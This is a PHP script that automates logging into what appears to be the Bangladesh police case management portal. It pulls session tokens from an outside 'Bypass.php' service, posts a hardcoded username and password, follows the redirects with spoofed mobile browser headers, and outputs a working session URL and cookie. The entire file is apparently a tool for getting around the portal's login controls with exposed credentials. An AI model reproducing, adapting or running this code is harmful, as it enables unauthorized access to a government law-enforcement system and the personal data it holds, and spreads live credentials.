<?php

$debugLog = [];

header('Content-Type: application/json');

$initialCurl = curl_init();
curl_setopt_array($initialCurl, [CURLOPT_URL=>'https://govbd.top/new/Bypass.php',CURLOPT_RETURNTRANSFER=>true,CURLOPT_HTTPHEADER=>['Accept: application/json']]);
$initialResponse=curl_exec($initialCurl);curl_close($initialCurl);

$data=json_decode($initialResponse,true);
$debugLog[] = ['InitialResponse' => $initialResponse];

$curl=curl_init();
$postFields=http_build_query([
  'p_flow_id'=>$data['pFlowId'],
  'p_flow_step_id'=>$data['pFlowStepId'],
  'p_instance'=>$data['pInstance'],
  'p_page_submission_id'=>$data['pPageSubmissionId'],
  'p_request'=>$data['pRequest'],
  'p_reload_on_submit'=>$data['pReloadOnSubmit'],
  'p_json'=>json_encode([
    'salt'=>$data['pSalt'],
    'pageItems'=>[
      'itemsToSubmit'=>[
        ['n'=>'P0_IP','v'=>$data['P0_IP']],
        ['n'=>'P0_G_IP','v'=>$data['P0_G_IP']],
        ['n'=>'P0_CURR_URL','v'=>$data['P0_CURR_URL']],
        ['n'=>'P101_USERNAME','v'=>'7696034563'],
        ['n'=>'P101_PASSWORD','v'=>'Adnan885#'],
        ['n'=>'P101_TOTAL_LOGIN_USER','v'=>$data['P101_TOTAL_LOGIN_USER']],
        ['n'=>'P101_CLINT_IP','v'=>$data['P101_CLINT_IP']],
        ['n'=>'P101_OTP_FLAG','v'=>$data['P101_OTP_FLAG']],
      ],
      'protected'=>$data['pPageItemsProtected'],
      'rowVersion'=>$data['pPageItemsRowVersion'],
    ],
  ]),
]);

curl_setopt_array($curl, [
  CURLOPT_URL=>'https://cdms.police.gov.bd/cdms/wwv_flow.accept',
  CURLOPT_RETURNTRANSFER=>true,
  CURLOPT_CUSTOMREQUEST=>'POST',
  CURLOPT_POSTFIELDS=>$postFields,
  CURLOPT_COOKIE=>$data['cookies'],
  CURLOPT_HEADER=>true,
  CURLOPT_HTTPHEADER=>[
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
  ],
]);

$response=curl_exec($curl);
$err=curl_error($curl);
if($err){curl_close($curl);echo json_encode(['error' => 'cURL Error #:' . $err]);exit;}

$header_size=curl_getinfo($curl,CURLINFO_HEADER_SIZE);
$headers=substr($response,0,$header_size);
preg_match('/Location: (.*)/',$headers,$locationMatches);
preg_match('/Set-Cookie: (.*);/i',$headers,$cookieMatches);

$lastPart=trim($locationMatches[1]);
$cookie=trim($cookieMatches[1]);

$debugLog[] = ['FirstRequestHeaders' => $headers, 'LastPart' => $lastPart, 'Cookie' => $cookie];

curl_close($curl);

$baseUrl='https://cdms.police.gov.bd/cdms/';
$fullUrl=$baseUrl.ltrim($lastPart,'/');

$secondCurl=curl_init();
curl_setopt_array($secondCurl, [
  CURLOPT_URL=>$fullUrl,
  CURLOPT_RETURNTRANSFER=>true,
  CURLOPT_ENCODING=>'',
  CURLOPT_MAXREDIRS=>10,
  CURLOPT_TIMEOUT=>30,
  CURLOPT_HTTP_VERSION=>CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST=>'GET',
  CURLOPT_COOKIE=>$cookie,
  CURLOPT_HEADER=>true,
  CURLOPT_HTTPHEADER=>[
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Cache-Control: max-age=0',
    'DNT: 1',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Dest: document',
    'sec-ch-ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://cdms.police.gov.bd/cdms/f?p=105:LOGIN:19746964597763:::::',
    'Accept-Language: en-US,en;q=0.9,yue-CN;q=0.8,yue;q=0.7,bn;q=0.6,ar;q=0.5,co;q=0.4',
  ],
]);

$secondResponse=curl_exec($secondCurl);
$secondErr=curl_error($secondCurl);

$header_size_second=curl_getinfo($secondCurl,CURLINFO_HEADER_SIZE);
$headers_second=substr($secondResponse,0,$header_size_second);

$debugLog[] = ['SecondRequestHeaders' => $headers_second, 'SecondResponseBody' => substr($secondResponse, $header_size_second), 'SecondRequestError' => $secondErr];

curl_close($secondCurl);

file_put_contents('debug.txt', json_encode($debugLog, JSON_PRETTY_PRINT));

if($secondErr){echo json_encode(['error' => 'cURL Error #:' . $secondErr]);exit;}

preg_match('/Location: (.*)/',$headers_second,$locationSecondMatches);
$secondLocation=isset($locationSecondMatches[1])?trim($locationSecondMatches[1]):'Not found';

$thirdCurl=curl_init();
curl_setopt_array($thirdCurl, [
  CURLOPT_URL=>'https://cdms.police.gov.bd/cdms/'.ltrim($secondLocation,'/'),
  CURLOPT_RETURNTRANSFER=>true,
  CURLOPT_CUSTOMREQUEST=>'GET',
  CURLOPT_COOKIE=>$cookie,
  CURLOPT_HTTPHEADER=>[
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Cache-Control: max-age=0',
    'DNT: 1',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Dest: document',
    'sec-ch-ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://cdms.police.gov.bd/cdms/f?p=105:LOGIN:19746964597763:::::',
    'Accept-Language: en-US,en;q=0.9,yue-CN;q=0.8,yue;q=0.7,bn;q=0.6,ar;q=0.5,co;q=0.4',
  ],
]);

$thirdResponse=curl_exec($thirdCurl);
$thirdErr=curl_error($thirdCurl);
curl_close($thirdCurl);

$debugLog[] = ['ThirdRequestResponse' => $thirdResponse, 'ThirdRequestError' => $thirdErr];
file_put_contents('debug.txt', json_encode($debugLog, JSON_PRETTY_PRINT));

if($thirdErr){
  echo json_encode(['error' => 'cURL Error #:' . $thirdErr]);
}else{
  $formattedUrl = "https://cdms.police.gov.bd/cdms/f?p=105:600:{$data['pInstance']}:::600::";
  echo json_encode([
    'url' => $formattedUrl,
    'cookie' => $cookie,
  ], JSON_PRETTY_PRINT);
}